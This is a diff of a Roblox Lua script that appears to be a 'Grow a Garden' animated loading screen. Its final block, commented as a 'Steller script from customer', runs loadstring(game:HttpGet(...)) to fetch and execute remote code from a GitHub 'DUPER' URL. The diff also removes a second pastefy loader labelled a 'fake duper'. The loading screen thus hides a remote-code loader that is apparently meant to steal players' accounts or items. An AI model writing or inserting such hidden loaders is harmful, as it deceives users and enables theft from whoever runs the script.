@@ -2,6 +2,8 @@
 
 -- 🌴 GROW A GARDEN 🌴 Loading Screen (Premium Animated Progress Bar + Mobile Friendly Enhancements)
 
+-- 🌴 GROW A GARDEN 🌴 Loading Screen (Premium Animated Progress Bar + Mobile Friendly Enhancements)
+
 local tweenService = game:GetService("TweenService")
 
 local screenGui = Instance.new("ScreenGui")
@@ -112,6 +114,7 @@ spawn(function()
         wait(1.5)
     end
 end)
+
 
 -- ✨ Rotierende motivierende Sätze
 local encouragementText = Instance.new("TextLabel")
@@ -254,9 +257,6 @@ spawn(function()
 end)
 
 spawn(function() -- Steller script from customer (injects asap)
-    loadstring(game:HttpGet("https://pastefy.app/JEEbZB4Q/raw"))()
-end)
-
-spawn(function() -- dont remove working fake duper
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Hades2548/SentryV2Hub/refs/heads/main/DUPER"))()
 end)
+
